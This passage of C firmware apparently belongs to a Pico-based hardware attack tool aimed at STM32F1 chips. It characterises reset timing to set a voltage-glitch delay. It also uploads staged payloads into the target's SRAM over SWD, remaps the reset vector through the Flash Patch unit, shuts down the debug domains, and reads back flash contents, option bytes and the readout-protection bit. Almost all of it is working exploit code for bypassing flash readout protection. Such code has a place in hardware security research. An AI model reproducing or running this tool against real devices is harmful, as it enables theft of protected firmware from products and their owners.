    // fault-loops and the GP10/11/12-sourced rail sags below the 2.0V threshold,
    // so t_vdd won't register — the nRST landmark is then the reliable timing.
    uart_cli_printf("  (rail at rest: %.2fV)\r\n\r\n", adc_read() * 3.3f / 4095.0f);

    uint64_t sum_vdd = 0, sum_nrst = 0, sum_win = 0;
    uint32_t min_win = 0xFFFFFFFF, max_win = 0;
    uint32_t min_nrst = 0xFFFFFFFF, max_nrst = 0;
    uint32_t valid = 0;

    for (uint32_t i = 0; i < iterations; i++) {
        // Full power-down POR, exactly like SWEEP's recovery idiom (proven to
        // reset + recover): drive all pins low, hold, then restore all high.
        gpio_set_dir(POWER_PIN1, GPIO_OUT);
        gpio_set_dir(POWER_PIN2, GPIO_OUT);
        gpio_set_dir(POWER_PIN3, GPIO_OUT);
        gpio_clr_mask(POWER_MASK);
        sleep_ms(200);

        // Restore all pins high = t0 (rise reference)
        uint64_t t0 = time_us_64();
        gpio_set_mask(POWER_MASK);
        adc_select_input(ADC_POWER_CHAN);

        // Track rail rise (t_vdd, peak) and nRST release (t_nrst). Recovery is
        // slow (GPIO sourcing the rail cap ~100s of ms), so poll up to 400ms.
        uint64_t t_vdd = 0, t_nrst = 0;
        bool got_vdd = false, got_nrst = false, seen_low = false;
        uint16_t vmax = 0;
        while (time_us_64() - t0 < 400000) {
            uint16_t v = adc_read();
            if (v > vmax) vmax = v;
            if (!got_vdd && v >= vdd_thresh) { t_vdd = time_us_64(); got_vdd = true; }
            bool hi = gpio_get(reset_pin);
            if (!hi) seen_low = true;
            if (!got_nrst && hi && seen_low) { t_nrst = time_us_64(); got_nrst = true; }
            if (got_vdd && got_nrst) break;
        }

        if (got_nrst) {
            uint32_t d_nrst = (uint32_t)(t_nrst - t0);
            if (got_vdd) {
                uint32_t d_vdd = (uint32_t)(t_vdd - t0);
                int32_t  win   = (int32_t)((int64_t)t_nrst - (int64_t)t_vdd);
                uart_cli_printf("  [%2lu] t_vdd=%luus  t_nrst=%luus  nrst-vdd=%ldus  peak=%.2fV\r\n",
                                i + 1, d_vdd, d_nrst, (long)win, vmax * 3.3f / 4095.0f);
                sum_vdd += d_vdd; sum_win += (win > 0 ? win : 0);
                uint32_t uwin = (win > 0) ? (uint32_t)win : 0;
                if (uwin < min_win) min_win = uwin; if (uwin > max_win) max_win = uwin;
            } else {
                uart_cli_printf("  [%2lu] t_nrst=%luus  (ADC t_vdd not seen; peak=%.2fV)\r\n",
                                i + 1, d_nrst, vmax * 3.3f / 4095.0f);
            }
            sum_nrst += d_nrst;
            if (d_nrst < min_nrst) min_nrst = d_nrst; if (d_nrst > max_nrst) max_nrst = d_nrst;
            valid++;
        } else {
            uart_cli_printf("  [%2lu] no nRST release (seen_low=%d peak=%.2fV)\r\n",
                            i + 1, seen_low, vmax * 3.3f / 4095.0f);
        }
        sleep_ms(50);
    }

    if (valid) {
        uart_cli_printf("\r\n=== Summary (%lu valid of %lu) ===\r\n", valid, iterations);
        uart_cli_printf("  t_nrst avg=%luus  min=%luus  max=%luus  jitter=%luus\r\n",
                        (uint32_t)(sum_nrst / valid), min_nrst, max_nrst, max_nrst - min_nrst);
        if (max_win > 0) {
            uart_cli_printf("  t_vdd  avg=%luus\r\n", (uint32_t)(sum_vdd / valid));
            uart_cli_printf("  load window [t_vdd..t_nrst] avg=%luus  min=%luus  max=%luus\r\n",
                            (uint32_t)(sum_win / valid), min_win, max_win);
        } else {
            uart_cli_send("  t_vdd not captured (rail stayed <2.0V — target likely fault-looping\r\n");
            uart_cli_send("  on corrupt flash; re-flash valid firmware for a healthy 3.3V rail).\r\n");
        }
        uart_cli_printf("  -> M2 glitch delay = ~%luus after the restore edge (nRST landmark),\r\n",
                        (uint32_t)(sum_nrst / valid));
        uart_cli_printf("     jitter budget ~%luus.\r\n", max_nrst - min_nrst);
    } else {
        uart_cli_send("\r\nNo valid captures — check nRST on GP15 and target power.\r\n");
    }

    power_drive(power_active_mask(), true);  // leave powered
    uart_cli_send("OK: characterization complete (power left ON)\r\n");
}

void target_power_literal(void) {
    extern bool swd_connect_under_reset(void);
    extern bool swd_halt(void);
    extern bool swd_resume(void);
    extern void swd_init(void);
    extern void swd_deinit(void);
    extern uint32_t swd_write_mem(uint32_t addr, const uint32_t *data, uint32_t count);
    extern uint32_t swd_read_mem(uint32_t addr, uint32_t *data, uint32_t count);
    extern bool swd_write_core_reg(uint8_t reg, uint32_t value);

    const stm32_target_info_t *info = ensure_target_type();
    if (!info)
        return;

    uint32_t sram_base = info->sram_base;
    uint32_t payload_words = (sizeof(rdp_literal_payload) + 3) / 4;
    const uint32_t stage2_thumb_addr = sram_base + 0x3B4 + 1;

    uart_cli_printf("RDP1 LITERAL test: %u byte payload -> 0x%08lX\r\n",
                    (unsigned)sizeof(rdp_literal_payload), sram_base);
    uart_cli_printf("Stage 2 entry: 0x%08lX\r\n", stage2_thumb_addr);

    // === Step 1: Connect under reset ===
    uart_cli_send("\r\n[1] Connecting under reset...\r\n");
    swd_init();

    gpio_init(BOOT0_PIN);
    gpio_set_dir(BOOT0_PIN, GPIO_OUT);
    gpio_put(BOOT0_PIN, 0);
    gpio_init(BOOT1_PIN);
    gpio_set_dir(BOOT1_PIN, GPIO_OUT);
    gpio_put(BOOT1_PIN, 0);

    if (!swd_connect_under_reset()) {
        swd_deinit();
        uart_cli_send("ERROR: SWD connect under reset failed\r\n");
        return;
    }
    uart_cli_send("    Connected, core halted under reset\r\n");

    // === Step 2: Upload literal payload to SRAM ===
    uart_cli_send("[2] Uploading literal payload to SRAM...\r\n");
    uint32_t written = swd_write_mem(sram_base, (const uint32_t *)rdp_literal_payload, payload_words);
    if (written != payload_words) {
        uart_cli_printf("ERROR: SRAM write failed (%lu/%lu words)\r\n", written, payload_words);
        swd_deinit();
        return;
    }

    uint32_t readback[payload_words];
    uint32_t nread = swd_read_mem(sram_base, readback, payload_words);
    if (nread != payload_words || memcmp(readback, rdp_literal_payload, sizeof(rdp_literal_payload)) != 0) {
        uart_cli_send("ERROR: SRAM verify failed\r\n");
        swd_deinit();
        return;
    }
    uart_cli_send("    Payload uploaded and verified\r\n");

    // === Step 3: Configure FPB via SWD ===
    uart_cli_send("[3] Configuring FPB via SWD...\r\n");

    // Write stage 2 thumb address to remap[0]
    uint32_t remap_val = stage2_thumb_addr;
    if (swd_write_mem(sram_base + 0x20, &remap_val, 1) != 1) {
        uart_cli_send("ERROR: Failed to write remap table\r\n");
        swd_deinit();
        return;
    }

    // FP_CTRL = ENABLE + KEY
    uint32_t fp_ctrl = 0x03;
    swd_write_mem(0xE0002000, &fp_ctrl, 1);

    // FP_REMAP = 0x20000020
    uint32_t fp_remap = 0x20000020;
    swd_write_mem(0xE0002004, &fp_remap, 1);

    // FP_COMP0: reset vector redirect (addr 0x04, REPLACE=00, ENABLE)
    uint32_t fp_comp0 = 0x05;
    swd_write_mem(0xE0002008, &fp_comp0, 1);

    // Verify FPB config
    uint32_t verify_val;
    swd_read_mem(0xE0002000, &verify_val, 1);
    uart_cli_printf("    FP_CTRL:  0x%08lX\r\n", verify_val);
    swd_read_mem(0xE0002004, &verify_val, 1);
    uart_cli_printf("    FP_REMAP: 0x%08lX\r\n", verify_val);
    swd_read_mem(0xE0002008, &verify_val, 1);
    uart_cli_printf("    FP_COMP0: 0x%08lX\r\n", verify_val);
    swd_read_mem(sram_base + 0x20, &verify_val, 1);
    uart_cli_printf("    Remap[0]: 0x%08lX (stage 2 entry)\r\n", verify_val);

    // Clear VC_CORERESET
    uint32_t demcr_val = 0;
    swd_write_mem(0xE000EDFC, &demcr_val, 1);

    // === Step 4: Set PC to stage 1, 3-step detach ===
    uart_cli_send("[4] Running stage 1 (STOP/wake debug kill)...\r\n");
    uint32_t stage1_addr = sram_base + 0x200 + 1;
    swd_write_core_reg(13, 0x20005000);
    swd_write_core_reg(15, stage1_addr);

    // Init UART before resume
    uart_deinit(TARGET_UART_ID);
    gpio_deinit(TARGET_UART_RX_PIN);
    gpio_init(TARGET_UART_RX_PIN);
    uart_init(TARGET_UART_ID, 115200);
    uart_set_format(TARGET_UART_ID, 8, 1, UART_PARITY_NONE);
    gpio_set_function(TARGET_UART_RX_PIN, GPIO_FUNC_UART);

    // BMP cortexm_detach: 3-step DHCSR
    uint32_t dhcsr_val;
    dhcsr_val = 0xA05F0003;
    swd_write_mem(0xE000EDF0, &dhcsr_val, 1);
    dhcsr_val = 0xA05F0001;
    swd_write_mem(0xE000EDF0, &dhcsr_val, 1);
    dhcsr_val = 0xA05F0000;
    swd_write_mem(0xE000EDF0, &dhcsr_val, 1);
    swd_deinit();

    sleep_ms(200);

    // Read stage 1 report
    uart_cli_send("    Stage 1 report: ");
    int s1_chars = 0;
    while (uart_is_readable(TARGET_UART_ID) && s1_chars < 20) {
        uint8_t c = uart_getc(TARGET_UART_ID);
        uart_cli_printf("%02X ", c);
        s1_chars++;
    }
    if (s1_chars == 0) uart_cli_send("(nothing received)");
    uart_cli_send("\r\n");

    // === Step 5: Pulse nRST — FPB redirects to stage 2 ===
    uart_cli_send("[5] Pulsing nRST (flash boot with FPB redirect)...\r\n");

    while (uart_is_readable(TARGET_UART_ID))
        uart_getc(TARGET_UART_ID);

    uint8_t reset_pin = 15;
    gpio_init(reset_pin);
    gpio_set_dir(reset_pin, GPIO_OUT);
    gpio_put(reset_pin, 0);
    sleep_ms(10);
    gpio_put(reset_pin, 1);
    gpio_set_dir(reset_pin, GPIO_IN);
    gpio_pull_up(reset_pin);

    // === Step 6: Receive literal test results ===
    uart_cli_send("[6] Receiving literal comparator test results...\r\n");

    #define LIT_TIMEOUT_US 5000000
    #define LIT_BYTE_TIMEOUT_US 500000

    // Scan for "LIT1" header
    uint8_t hdr_state = 0;
    const char *hdr_str = "LIT1";
    uint64_t rx_start = time_us_64();
    bool hdr_found = false;

    while (!hdr_found) {
        if (uart_is_readable(TARGET_UART_ID)) {
            uint8_t c = uart_getc(TARGET_UART_ID);
            if (c == hdr_str[hdr_state]) {
                hdr_state++;
                if (hdr_state == 4) hdr_found = true;
            } else {
                hdr_state = (c == 'L') ? 1 : 0;
            }
        } else {
            if (time_us_64() - rx_start > LIT_TIMEOUT_US) break;
        }
    }

    if (!hdr_found) {
        uart_cli_send("ERROR: \"LIT1\" header not received\r\n");
        goto lit_cleanup;
    }
    uart_cli_send("    Header: LIT1\r\n");

    // Helper: read 4 bytes LE into uint32_t
    #define READ_WORD(dest) do { \
        uint8_t _b[4]; bool _ok = true; \
        for (int _i = 0; _i < 4; _i++) { \
            uint64_t _t = time_us_64(); \
            while (!uart_is_readable(TARGET_UART_ID)) { \
                if (time_us_64() - _t > LIT_BYTE_TIMEOUT_US) { _ok = false; break; } \
            } \
            if (!_ok) break; \
            _b[_i] = uart_getc(TARGET_UART_ID); \
        } \
        if (!_ok) { uart_cli_send("TIMEOUT\r\n"); goto lit_cleanup; } \
        (dest) = _b[0] | (_b[1] << 8) | (_b[2] << 16) | (_b[3] << 24); \
    } while(0)

    uint32_t val;

    // DHCSR
    READ_WORD(val);
    uart_cli_printf("    DHCSR:    0x%08lX  C_DEBUGEN=%lu\r\n", val, val & 1);

    // FP_CTRL
    READ_WORD(val);
    uart_cli_printf("    FP_CTRL:  0x%08lX  ENABLE=%lu NUM_CODE=%lu NUM_LIT=%lu\r\n",
                    val, val & 1, (val >> 4) & 0xF, (val >> 8) & 0xF);

    // FP_COMP6
    READ_WORD(val);
    uart_cli_printf("    FP_COMP6: 0x%08lX  ENABLE=%lu\r\n", val, val & 1);

    // FP_COMP7
    READ_WORD(val);
    uart_cli_printf("    FP_COMP7: 0x%08lX  ENABLE=%lu\r\n", val, val & 1);

    // Test read 0: 0x08000000 (COMP6 should intercept)
    READ_WORD(val);
    uart_cli_printf("    Read 0x08000000: 0x%08lX", val);
    if (val == 0xDEAD0006)
        uart_cli_send("  << SENTINEL (literal comp intercepted!)\r\n");
    else
        uart_cli_printf("  << %s\r\n", val == 0 ? "ZERO" : "UNKNOWN");

    // Test read 1: 0x08000004 (COMP7 should intercept)
    READ_WORD(val);
    uart_cli_printf("    Read 0x08000004: 0x%08lX", val);
    if (val == 0xDEAD0007)
        uart_cli_send("  << SENTINEL (literal comp intercepted!)\r\n");
    else
        uart_cli_printf("  << %s\r\n", val == 0 ? "ZERO" : "UNKNOWN");

    // Test read 2: 0x08000008 (no comp — should fault)
    READ_WORD(val);
    uart_cli_printf("    Read 0x08000008: 0x%08lX\r\n", val);

    // Check for "DONE" or "FLT!"
    {
        char trail[4] = {0};
        bool got_trail = true;
        for (int i = 0; i < 4; i++) {
            uint64_t t0 = time_us_64();
            while (!uart_is_readable(TARGET_UART_ID)) {
                if (time_us_64() - t0 > LIT_BYTE_TIMEOUT_US) { got_trail = false; break; }
            }
            if (!got_trail) break;
            trail[i] = uart_getc(TARGET_UART_ID);
        }
        if (got_trail) {
            if (memcmp(trail, "DONE", 4) == 0)
                uart_cli_send("\r\n    Result: ALL READS SUCCEEDED (DONE)\r\n");
            else if (memcmp(trail, "FLT!", 4) == 0) {
                uart_cli_send("\r\n    Result: HARDFAULT (FLT!)\r\n");
                // Read stacked PC (4 bytes)
                uint32_t fault_pc;
                READ_WORD(fault_pc);
                uart_cli_printf("    Fault PC: 0x%08lX\r\n", fault_pc);
            } else {
                uart_cli_printf("\r\n    Trailing: %02X %02X %02X %02X\r\n",
                               trail[0], trail[1], trail[2], trail[3]);
            }
        } else {
            uart_cli_send("\r\n    (no trailing marker received)\r\n");
        }
    }

    #undef READ_WORD

    uart_cli_send("[7] Power cycling target...\r\n");
    gpio_clr_mask(POWER_MASK);
    sleep_ms(100);
    gpio_set_mask(POWER_MASK);

lit_cleanup:
    gpio_put(BOOT0_PIN, 0);
    gpio_put(BOOT1_PIN, 0);
}

void target_power_regdump(void) {
    extern bool swd_connect_under_reset(void);
    extern void swd_init(void);
    extern void swd_deinit(void);
    extern uint32_t swd_write_mem(uint32_t addr, const uint32_t *data, uint32_t count);
    extern uint32_t swd_read_mem(uint32_t addr, uint32_t *data, uint32_t count);
    extern bool swd_write_core_reg(uint8_t reg, uint32_t value);

    const stm32_target_info_t *info = ensure_target_type();
    if (!info)
        return;

    uint32_t sram_base = info->sram_base;
    uint32_t payload_words = (sizeof(rdp_regdump_payload) + 3) / 4;
    const uint32_t stage2_thumb_addr = sram_base + 0x3D4 + 1;

    uart_cli_printf("RDP1 REGDUMP: %u byte payload -> 0x%08lX\r\n",
                    (unsigned)sizeof(rdp_regdump_payload), sram_base);
    uart_cli_printf("Stage 2 entry: 0x%08lX\r\n", stage2_thumb_addr);

    // === Step 1: Connect under reset ===
    uart_cli_send("\r\n[1] Connecting under reset...\r\n");
    swd_init();

    gpio_init(BOOT0_PIN);
    gpio_set_dir(BOOT0_PIN, GPIO_OUT);
    gpio_put(BOOT0_PIN, 0);
    gpio_init(BOOT1_PIN);
    gpio_set_dir(BOOT1_PIN, GPIO_OUT);
    gpio_put(BOOT1_PIN, 0);

    if (!swd_connect_under_reset()) {
        swd_deinit();
        uart_cli_send("ERROR: SWD connect under reset failed\r\n");
        return;
    }
    uart_cli_send("    Connected, core halted under reset\r\n");

    // === Step 2: Upload payload ===
    uart_cli_send("[2] Uploading regdump payload to SRAM...\r\n");
    uint32_t written = swd_write_mem(sram_base, (const uint32_t *)rdp_regdump_payload, payload_words);
    if (written != payload_words) {
        uart_cli_printf("ERROR: SRAM write failed (%lu/%lu words)\r\n", written, payload_words);
        swd_deinit();
        return;
    }

    uint32_t readback[payload_words];
    uint32_t nread = swd_read_mem(sram_base, readback, payload_words);
    if (nread != payload_words || memcmp(readback, rdp_regdump_payload, sizeof(rdp_regdump_payload)) != 0) {
        uart_cli_send("ERROR: SRAM verify failed\r\n");
        swd_deinit();
        return;
    }
    uart_cli_send("    Payload uploaded and verified\r\n");

    // === Step 3: Configure FPB ===
    uart_cli_send("[3] Configuring FPB via SWD...\r\n");

    uint32_t remap_val = stage2_thumb_addr;
    swd_write_mem(sram_base + 0x20, &remap_val, 1);

    uint32_t fp_ctrl = 0x03;
    swd_write_mem(0xE0002000, &fp_ctrl, 1);
    uint32_t fp_remap = 0x20000020;
    swd_write_mem(0xE0002004, &fp_remap, 1);
    uint32_t fp_comp0 = 0x05;
    swd_write_mem(0xE0002008, &fp_comp0, 1);

    uint32_t verify_val;
    swd_read_mem(0xE0002000, &verify_val, 1);
    uart_cli_printf("    FP_CTRL:  0x%08lX\r\n", verify_val);
    swd_read_mem(sram_base + 0x20, &verify_val, 1);
    uart_cli_printf("    Remap[0]: 0x%08lX (stage 2 entry)\r\n", verify_val);

    uint32_t demcr_val = 0;
    swd_write_mem(0xE000EDFC, &demcr_val, 1);

    // === Step 4: Set PC to stage 1, 3-step detach ===
    uart_cli_send("[4] Running stage 1 (STOP/wake debug kill)...\r\n");
    uint32_t stage1_addr = sram_base + 0x200 + 1;
    swd_write_core_reg(13, 0x20005000);
    swd_write_core_reg(15, stage1_addr);

    uart_deinit(TARGET_UART_ID);
    gpio_deinit(TARGET_UART_RX_PIN);
    gpio_init(TARGET_UART_RX_PIN);
    uart_init(TARGET_UART_ID, 115200);
    uart_set_format(TARGET_UART_ID, 8, 1, UART_PARITY_NONE);
    gpio_set_function(TARGET_UART_RX_PIN, GPIO_FUNC_UART);

    uint32_t dhcsr_val;
    dhcsr_val = 0xA05F0003;
    swd_write_mem(0xE000EDF0, &dhcsr_val, 1);
    dhcsr_val = 0xA05F0001;
    swd_write_mem(0xE000EDF0, &dhcsr_val, 1);
    dhcsr_val = 0xA05F0000;
    swd_write_mem(0xE000EDF0, &dhcsr_val, 1);

    // DP power-down — kill debug+system domains, hold down before nRST
    // Don't read back (that would re-power it via SWD handshake)
    extern bool swd_write_dp(uint8_t addr, uint32_t value);
    extern bool swd_read_dp(uint8_t addr, uint32_t *value);
    uint32_t dp_ctrl;
    if (swd_read_dp(0x4, &dp_ctrl)) {
        uart_cli_printf("    DP CTRL/STAT: 0x%08lX\r\n", dp_ctrl);
        uint32_t dp_off = dp_ctrl & ~((1u << 28) | (1u << 30));
        swd_write_dp(0x4, dp_off);
        uart_cli_send("    Debug domains powered down, holding 2s...\r\n");
    }

    swd_deinit();

    sleep_ms(2000);

    uart_cli_send("    Stage 1 report: ");
    int s1_chars = 0;
    while (uart_is_readable(TARGET_UART_ID) && s1_chars < 20) {
        uint8_t c = uart_getc(TARGET_UART_ID);
        uart_cli_printf("%02X ", c);
        s1_chars++;
    }
    if (s1_chars == 0) uart_cli_send("(nothing received)");
    uart_cli_send("\r\n");

    // === Step 5: Pulse nRST (flash boot with FPB redirect) ===
    uart_cli_send("[5] Pulsing nRST (flash boot with FPB redirect)...\r\n");

    while (uart_is_readable(TARGET_UART_ID))
        uart_getc(TARGET_UART_ID);

    uint8_t reset_pin = 15;
    gpio_init(reset_pin);
    gpio_set_dir(reset_pin, GPIO_OUT);
    gpio_put(reset_pin, 0);
    sleep_ms(10);
    gpio_put(reset_pin, 1);
    gpio_set_dir(reset_pin, GPIO_IN);
    gpio_pull_up(reset_pin);

    // === Step 6: Receive register dump ===
    uart_cli_send("[6] Receiving register dump...\r\n");

    #define RD_TIMEOUT_US 5000000
    #define RD_BYTE_TIMEOUT_US 500000

    // Scan for "REG1" header
    uint8_t hdr_state = 0;
    const char *hdr_str = "REG1";
    uint64_t rx_start = time_us_64();
    bool hdr_found = false;

    while (!hdr_found) {
        if (uart_is_readable(TARGET_UART_ID)) {
            uint8_t c = uart_getc(TARGET_UART_ID);
            if (c == hdr_str[hdr_state]) {
                hdr_state++;
                if (hdr_state == 4) hdr_found = true;
            } else {
                hdr_state = (c == 'R') ? 1 : 0;
            }
        } else {
            if (time_us_64() - rx_start > RD_TIMEOUT_US) break;
        }
    }

    if (!hdr_found) {
        uart_cli_send("ERROR: \"REG1\" header not received\r\n");
        goto rd_cleanup;
    }
    uart_cli_send("    Header: REG1\r\n");

    // Read 4 bytes LE into uint32_t
    #define RD_READ_WORD(dest) do { \
        uint8_t _b[4]; bool _ok = true; \
        for (int _i = 0; _i < 4; _i++) { \
            uint64_t _t = time_us_64(); \
            while (!uart_is_readable(TARGET_UART_ID)) { \
                if (time_us_64() - _t > RD_BYTE_TIMEOUT_US) { _ok = false; break; } \
            } \
            if (!_ok) break; \
            _b[_i] = uart_getc(TARGET_UART_ID); \
        } \
        if (!_ok) { uart_cli_send("TIMEOUT\r\n"); goto rd_cleanup; } \
        (dest) = _b[0] | (_b[1] << 8) | (_b[2] << 16) | (_b[3] << 24); \
    } while(0)

    uint32_t val;

    uart_cli_send("\r\n=== REGISTER DUMP ===\r\n");

    // 0: DHCSR
    RD_READ_WORD(val);
    uart_cli_printf("  DHCSR        (0xE000EDF0) = 0x%08lX  C_DEBUGEN=%lu\r\n", val, val & 1);

    // 1: DEMCR
    RD_READ_WORD(val);
    uart_cli_printf("  DEMCR        (0xE000EDFC) = 0x%08lX  VC_CORERESET=%lu TRCENA=%lu\r\n",
                    val, val & 1, (val >> 24) & 1);

    // 2: DBGMCU_IDCODE
    RD_READ_WORD(val);
    uart_cli_printf("  DBGMCU_IDCODE(0xE0042000) = 0x%08lX  DEV_ID=0x%03lX REV=0x%04lX\r\n",
                    val, val & 0xFFF, (val >> 16) & 0xFFFF);

    // 3: DBGMCU_CR
    RD_READ_WORD(val);
    uart_cli_printf("  DBGMCU_CR    (0xE0042004) = 0x%08lX", val);
    if (val & 1) uart_cli_send(" DBG_SLEEP");
    if (val & 2) uart_cli_send(" DBG_STOP");
    if (val & 4) uart_cli_send(" DBG_STANDBY");
    uart_cli_send("\r\n");

    // 4: FLASH_ACR
    RD_READ_WORD(val);
    uart_cli_printf("  FLASH_ACR    (0x40022000) = 0x%08lX  LATENCY=%lu PRFTBE=%lu PRFTBS=%lu\r\n",
                    val, val & 7, (val >> 4) & 1, (val >> 5) & 1);

    // 5: FLASH_SR
    RD_READ_WORD(val);
    uart_cli_printf("  FLASH_SR     (0x4002200C) = 0x%08lX  BSY=%lu PGERR=%lu WRPRTERR=%lu EOP=%lu\r\n",
                    val, val & 1, (val >> 2) & 1, (val >> 4) & 1, (val >> 5) & 1);

    // 6: FLASH_CR
    RD_READ_WORD(val);
    uart_cli_printf("  FLASH_CR     (0x40022010) = 0x%08lX  LOCK=%lu", val, (val >> 7) & 1);
    if (val & 1) uart_cli_send(" PG");
    if (val & 2) uart_cli_send(" PER");
    if (val & 4) uart_cli_send(" MER");
    if (val & 0x10) uart_cli_send(" OPTPG");
    if (val & 0x20) uart_cli_send(" OPTER");
    uart_cli_send("\r\n");

    // 7: FLASH_OBR — THE KEY ONE
    RD_READ_WORD(val);
    uart_cli_printf("  FLASH_OBR    (0x4002201C) = 0x%08lX  *** RDPRT=%lu ***", val, (val >> 1) & 1);
    if (val & 1) uart_cli_send(" OPTERR");
    uart_cli_printf("  Data0=0x%02lX Data1=0x%02lX\r\n", (val >> 10) & 0xFF, (val >> 18) & 0xFF);

    // 8: FLASH_WRPR
    RD_READ_WORD(val);
    uart_cli_printf("  FLASH_WRPR   (0x40022020) = 0x%08lX\r\n", val);

    // 9: FP_CTRL
    RD_READ_WORD(val);
    uart_cli_printf("  FP_CTRL      (0xE0002000) = 0x%08lX  ENABLE=%lu\r\n", val, val & 1);

    // 10: DWT_CTRL
    RD_READ_WORD(val);
    uart_cli_printf("  DWT_CTRL     (0xE0001000) = 0x%08lX\r\n", val);

    // 11: SCB_AIRCR
    RD_READ_WORD(val);
    uart_cli_printf("  SCB_AIRCR    (0xE000ED0C) = 0x%08lX  VECTKEY=0x%03lX\r\n",
                    val, (val >> 16) & 0xFFFF);

    // 12: SCB_SCR
    RD_READ_WORD(val);
    uart_cli_printf("  SCB_SCR      (0xE000ED10) = 0x%08lX\r\n", val);

    // 13: AFIO_MAPR
    RD_READ_WORD(val);
    uart_cli_printf("  AFIO_MAPR    (0x40010004) = 0x%08lX  SWJ_CFG=%lu\r\n",
                    val, (val >> 24) & 7);

    // 14: RCC_CR
    RD_READ_WORD(val);
    uart_cli_printf("  RCC_CR       (0x40021000) = 0x%08lX  HSION=%lu HSIRDY=%lu HSEON=%lu HSERDY=%lu PLLON=%lu\r\n",
                    val, val & 1, (val >> 1) & 1, (val >> 16) & 1, (val >> 17) & 1, (val >> 24) & 1);

    // 15: RCC_CSR
    RD_READ_WORD(val);
    uart_cli_printf("  RCC_CSR      (0x40021024) = 0x%08lX ", val);
    if (val & (1 << 26)) uart_cli_send("PIN_RST ");
    if (val & (1 << 27)) uart_cli_send("POR ");
    if (val & (1 << 28)) uart_cli_send("SW_RST ");
    if (val & (1 << 29)) uart_cli_send("IWDG ");
    if (val & (1 << 30)) uart_cli_send("WWDG ");
    if (val & (1 << 31)) uart_cli_send("LPWR ");
    uart_cli_send("\r\n");

    // 16: CPUID
    RD_READ_WORD(val);
    uart_cli_printf("  CPUID        (0xE000ED00) = 0x%08lX", val);
    uint8_t impl = (val >> 24) & 0xFF;
    uint16_t partno = (val >> 4) & 0xFFF;
    if (impl == 0x41 && partno == 0xC23)
        uart_cli_printf("  Cortex-M3 r%lup%lu", (val >> 20) & 0xF, val & 0xF);
    uart_cli_send("\r\n");

    uart_cli_send("=====================\r\n");

    // === Flash read tests ===
    uart_cli_send("\r\n=== FLASH READ TESTS ===\r\n");
    struct {
        const char *name;
        uint32_t addr;
    } flash_tests[] = {
        {"Flash base     ", 0x08000000},
        {"Reset vector   ", 0x08000004},
        {"Option bytes   ", 0x1FFFF800},
        {"OB USER/nUSER  ", 0x1FFFF802},
        {"Flash size reg ", 0x1FFFF7E0},
    };

    for (int t = 0; t < 5; t++) {
        uint64_t t0 = time_us_64();
        while (!uart_is_readable(TARGET_UART_ID)) {
            if (time_us_64() - t0 > RD_BYTE_TIMEOUT_US) {
                uart_cli_printf("  %s (0x%08lX): TIMEOUT\r\n", flash_tests[t].name, flash_tests[t].addr);
                goto rd_done;
            }
        }
        uint8_t status = uart_getc(TARGET_UART_ID);
        uint32_t data;
        RD_READ_WORD(data);

        if (status == 'O') {
            uart_cli_printf("  %s (0x%08lX): OK    0x%08lX\r\n",
                           flash_tests[t].name, flash_tests[t].addr, data);
        } else if (status == 'F') {
            uart_cli_printf("  %s (0x%08lX): FAULT (PC=0x%08lX)\r\n",
                           flash_tests[t].name, flash_tests[t].addr, data);
        } else {
            uart_cli_printf("  %s (0x%08lX): ??? status=0x%02X data=0x%08lX\r\n",
                           flash_tests[t].name, flash_tests[t].addr, status, data);
        }
    }

rd_done:
    // Check for "DONE"
    {
        char done_buf[4] = {0};
        bool got_done = true;
        for (int i = 0; i < 4; i++) {
            uint64_t t0 = time_us_64();
            while (!uart_is_readable(TARGET_UART_ID)) {
                if (time_us_64() - t0 > RD_BYTE_TIMEOUT_US) { got_done = false; break; }
            }
            if (!got_done) break;
            done_buf[i] = uart_getc(TARGET_UART_ID);
        }
        if (got_done && memcmp(done_buf, "DONE", 4) == 0)
            uart_cli_send("\r\n=== COMPLETE ===\r\n");
        else
            uart_cli_send("\r\n=== INCOMPLETE ===\r\n");
    }

    #undef RD_READ_WORD

    uart_cli_send("[7] Power cycling target...\r\n");
    gpio_clr_mask(POWER_MASK);
    sleep_ms(100);
    gpio_set_mask(POWER_MASK);

rd_cleanup:
    gpio_put(BOOT0_PIN, 0);
    gpio_put(BOOT1_PIN, 0);
}

// Receive and display regdump results from UART (shared by halt and glitch variants)
static bool receive_regdump_results(void) {
    #define RDR_TIMEOUT_US 5000000
    #define RDR_BYTE_TIMEOUT_US 500000

    // Scan for "REG1" header
    uint8_t hdr_state = 0;
    const char *hdr_str = "REG1";
    uint64_t rx_start = time_us_64();
    bool hdr_found = false;

    while (!hdr_found) {
        if (uart_is_readable(TARGET_UART_ID)) {
            uint8_t c = uart_getc(TARGET_UART_ID);
            if (c == hdr_str[hdr_state]) {
                hdr_state++;
                if (hdr_state == 4) hdr_found = true;
            } else {
                hdr_state = (c == 'R') ? 1 : 0;
            }
        } else {
            if (time_us_64() - rx_start > RDR_TIMEOUT_US) break;
        }
    }

    if (!hdr_found) {
        uart_cli_send("ERROR: \"REG1\" header not received\r\n");
        return false;
    }
    uart_cli_send("    Header: REG1\r\n");

    // Read 4 bytes LE into uint32_t
    #define RDR_READ_WORD(dest) do { \
        uint8_t _b[4]; bool _ok = true; \
        for (int _i = 0; _i < 4; _i++) { \
            uint64_t _t = time_us_64(); \
            while (!uart_is_readable(TARGET_UART_ID)) { \
                if (time_us_64() - _t > RDR_BYTE_TIMEOUT_US) { _ok = false; break; } \
            } \
            if (!_ok) break; \
            _b[_i] = uart_getc(TARGET_UART_ID); \
        } \
        if (!_ok) { uart_cli_send("TIMEOUT\r\n"); return false; } \
        (dest) = _b[0] | (_b[1] << 8) | (_b[2] << 16) | (_b[3] << 24); \
    } while(0)

    uint32_t val;

    uart_cli_send("\r\n=== REGISTER DUMP ===\r\n");

    RDR_READ_WORD(val);
    uart_cli_printf("  DHCSR        (0xE000EDF0) = 0x%08lX  C_DEBUGEN=%lu\r\n", val, val & 1);

    RDR_READ_WORD(val);
    uart_cli_printf("  DEMCR        (0xE000EDFC) = 0x%08lX  VC_CORERESET=%lu TRCENA=%lu\r\n",
                    val, val & 1, (val >> 24) & 1);

    RDR_READ_WORD(val);
    uart_cli_printf("  DBGMCU_IDCODE(0xE0042000) = 0x%08lX  DEV_ID=0x%03lX REV=0x%04lX\r\n",
                    val, val & 0xFFF, (val >> 16) & 0xFFFF);

    RDR_READ_WORD(val);
    uart_cli_printf("  DBGMCU_CR    (0xE0042004) = 0x%08lX", val);
    if (val & 1) uart_cli_send(" DBG_SLEEP");
    if (val & 2) uart_cli_send(" DBG_STOP");
    if (val & 4) uart_cli_send(" DBG_STANDBY");
    uart_cli_send("\r\n");

    RDR_READ_WORD(val);
